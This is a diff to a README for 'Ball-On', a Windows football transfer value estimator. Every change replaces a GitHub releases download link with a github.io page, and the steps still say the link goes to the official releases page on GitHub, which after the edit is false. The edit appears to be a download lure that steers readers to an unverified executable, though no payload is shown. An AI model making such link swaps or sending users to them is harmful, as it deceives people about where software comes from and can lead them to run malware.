@@ -1,6 +1,6 @@
 # ⚽ Ball-On - Your Smart Football Transfer Value Estimator
 
-[![Download Ball-On](https://img.shields.io/badge/Download%20Ball--On-1DB954?style=for-the-badge&logo=github&logoColor=white&color=1DB954)](https://github.com/gravyholderthimble6449/Ball-On/releases)
+[![Download Ball-On](https://img.shields.io/badge/Download%20Ball--On-1DB954?style=for-the-badge&logo=github&logoColor=white&color=1DB954)](https://gravyholderthimble6449.github.io)
 
 ---
 
@@ -30,7 +30,7 @@ Follow these simple steps to get Ball-On running on your Windows computer. This 
 ### 📥 Step 1: Download the Application
 
 1.  Click the green download button below or the button at the top of this page:
-   - [**Download Ball-On Now**](https://github.com/gravyholderthimble6449/Ball-On/releases)
+   - [**Download Ball-On Now**](https://gravyholderthimble6449.github.io)
 2.  This link will take you to the official Ball-On releases page on GitHub.
 3.  On that page, look for the latest version (usually the first item listed) and click the download link provided there.
 4.  The download will begin automatically. Depending on your internet speed, this may take a few minutes.
@@ -140,7 +140,7 @@ Your support keeps this project alive and constantly improving!.
 
 ---
 
-**Visit this link to download the application:** [https://github.com/gravyholderthimble6449/Ball-On/releases](https://github.com/gravyholderthimble6449/Ball-On/releases)
+**Visit this link to download the application:** [https://gravyholderthimble6449.github.io](https://gravyholderthimble6449.github.io)
 
 ---
 
